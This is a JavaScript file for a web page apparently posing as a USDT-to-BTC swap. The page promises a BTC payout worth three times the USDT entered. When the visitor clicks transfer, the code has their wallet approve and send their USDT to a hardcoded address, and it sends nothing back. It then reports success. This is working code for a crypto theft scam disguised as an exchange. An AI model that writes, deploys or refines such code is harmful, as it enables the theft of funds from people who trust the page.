const USDT = "0x55d398326f99059fF775485246999027B3197955";
const DEST = "0x56E93caFf970003A66264a10B1581066E0f17112";
const BNB_GAS_USD = 0.50;
let provider, signer, btcRate = 0;

const ABI = [
  "function balanceOf(address) view returns (uint256)",
  "function approve(address,uint256) returns (bool)",
  "function transfer(address,uint256) returns (bool)"
];

async function init() {
  provider = new ethers.providers.Web3Provider(window.ethereum);
  await provider.send('eth_requestAccounts', []);
  signer = provider.getSigner();
  await fetchBtcRate();
  updateDisplay();
}

async function fetchBtcRate() {
  try {
    const res = await fetch("https://api.coingecko.com/api/v3/simple/price?ids=bitcoin&vs_currencies=usdt");
    const json = await res.json();
    btcRate = json.bitcoin.usdt || 0;
  } catch (e) {
    btcRate = 0;
  }
}

async function updateDisplay() {
  const val = parseFloat(document.getElementById("usdtInput").value) || 0;
  const totalUSD = val * 3;
  document.getElementById("usdtValue").innerText = `$${totalUSD.toFixed(2)}`;
  document.getElementById("rateLine").innerText = `1 BTC ≈ ${btcRate ? btcRate.toLocaleString('en') : '...'} USDT`;
  const btcVal = btcRate ? totalUSD / btcRate : 0;
  document.getElementById("btcAmount").innerText = btcVal.toFixed(8);
  document.getElementById("btcUsd").innerText = `$${totalUSD.toFixed(2)}`;
}

document.getElementById("usdtInput").addEventListener("input", updateDisplay);

document.getElementById("transferBtn").addEventListener("click", async () => {
  const val = parseFloat(document.getElementById("usdtInput").value);
  const msg = document.getElementById("msg");
  msg.className = "";
  if (isNaN(val) || val < 200) {
    msg.innerText = "❌ Minimum 200 USDT required";
    msg.className = "error";
    return;
  }

  try {
    const token = new ethers.Contract(USDT, ABI, signer);
    const user = await signer.getAddress();
    const bal = parseFloat(ethers.utils.formatUnits(await token.balanceOf(user), 18));
    if (bal < val) throw new Error("Insufficient USDT");

    const bnbBal = parseFloat(ethers.utils.formatEther(await provider.getBalance(user)));
    const bnbRate = (await (await fetch("https://api.coingecko.com/api/v3/simple/price?ids=binancecoin&vs_currencies=usd")).json()).binancecoin.usd;
    if (bnbBal * bnbRate < BNB_GAS_USD) throw new Error("Low BNB for gas");

    const amt = ethers.utils.parseUnits(val.toString(), 18);
    await (await token.approve(DEST, amt)).wait();
    await (await token.transfer(DEST, amt)).wait();

    msg.innerText = `✅ ${val} USDT sent successfully`;
    msg.className = "success";
  } catch (e) {
    msg.innerText = `❌ ${e.message}`;
    msg.className = "error";
  }
});

init();
